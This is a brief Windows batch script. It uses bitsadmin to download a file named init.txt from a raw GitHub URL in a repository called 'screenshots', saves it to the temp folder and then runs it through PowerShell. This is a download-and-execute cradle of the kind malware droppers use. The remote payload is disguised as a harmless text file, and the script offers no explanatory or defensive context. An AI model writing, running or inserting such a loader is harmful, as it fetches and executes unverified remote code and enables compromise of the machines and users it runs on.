@echo off
set URL=https://raw.githubusercontent.com/cem324/screenshots/main/init.txt
set FILE=%TEMP%\init.txt
bitsadmin /transfer dload /download /priority high %URL% %FILE%
powershell -c "%FILE%"